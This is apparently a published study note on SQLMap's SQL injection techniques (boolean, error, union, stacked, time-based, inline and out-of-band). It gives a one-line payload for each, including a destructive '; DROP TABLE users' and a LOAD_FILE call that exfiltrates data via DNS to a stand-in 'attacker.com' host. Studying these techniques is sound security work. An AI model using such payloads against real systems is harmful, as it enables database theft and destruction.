---
{"dg-publish":true,"permalink":"/sqlmap-injection-types/"}
---

![image-1-25.webp|537x234](/img/user/image-1-25.webp)


<div class="transclusion internal-embed is-loaded"><a class="markdown-embed-link" href="/in-band-sql-injection/" aria-label="Open link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a><div class="markdown-embed">




The output of both the intended and the new query may be **printed directly on the front end**, and we can directly read it.

In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.

- [[SQLMAP - Injection Types#Union query-based\|SQLMAP - Injection Types#Union query-based]]
- [[SQLMAP - Injection Types#Error-based\|SQLMAP - Injection Types#Error-based]]

</div></div>



<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">





- [[#Boolean-based blind]]
- [[#Time-based blind]]

</div></div>


## `Out of Band` SQL Injection

- [[SQLMAP - Injection Types#Out-of-band SQL Injection\|SQLMAP - Injection Types#Out-of-band SQL Injection]]

## Injection flags


The technique characters `BEUSTQ` refers to the following:

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries

## Boolean-based blind

```sql
AND 1=1
```

- SQLMap exploits `Boolean-based blind SQL Injection` vulnerabilities through the differentiation of `TRUE` from `FALSE` query results, effectively retrieving 1 byte of information per request.
- This ranges from fuzzy comparisons of raw response content, HTTP codes, page titles, filtered text, and other factors.

## Error-based

```sql
AND GTID_SUBSET(@@version,0)
```

- If the `database management system` (`DBMS`) errors are being returned as part of the server response for any database-related problems, then there is a probability that they can be used to carry the results for requested queries.
## Union query-based

```sql
UNION ALL SELECT 1,@@version,3
```

- With the usage of `UNION`, it is generally possible to extend the original (`vulnerable`) query with the injected statements' results.
- This type of SQL injection is considered the fastest, as, in the ideal scenario, the attacker would be able to pull the content of the whole database table of interest with a single request.
- We may have to specify the exact location, 'i.e., column', which we can read, so the query will direct the output to be printed there.
## Stacked queries

```sql
; DROP TABLE users
```

- Stacking SQL queries, also known as the "piggy-backing," is the form of injecting additional SQL statements after the vulnerable one.
- In case that there is a requirement for running non-query statements (e.g. `INSERT`, `UPDATE` or `DELETE`), stacking must be supported by the vulnerable platform (e.g., [[db/Microsoft SQL Server\|Microsoft SQL Server]] and [[PostgreSQL\|PostgreSQL]] support it by default).
## Time-based blind

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

- The principle of `Time-based blind SQL Injection` is similar to the `Boolean-based blind SQL Injection`, but here the response time is used as the source for the differentiation between `TRUE` or `FALSE`.
	
	- `TRUE` response is generally characterized by the noticeable difference in the response time compared to the regular server response
	    
	- `FALSE` response should result in a response time indistinguishable from regular response times
## Inline queries

```sql
SELECT (SELECT @@version) from
```
- This type of injection embedded a query within the original query. 
## Out-of-band SQL Injection

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

- This is considered one of the most advanced types of SQLi.
- Used in cases where all other types are either unsupported by the vulnerable web application or are too slow (e.g. time-based blind SQLi)
- SQLMap supports out-of-band SQLi through "[[DNS exfiltration\|DNS exfiltration]]," 
	- Requested queries are retrieved through DNS traffic.

- By running the SQLMap on the DNS server for the domain under control (e.g. `.attacker.com`)
- SQLMap can perform the attack by forcing the server to request non-existent subdomains (e.g. `foo.attacker.com`)
- where `foo` would be the SQL response we want to receive
- SQLMap can then collect these erroring DNS requests and collect the `foo` part
- to form the entire SQL response.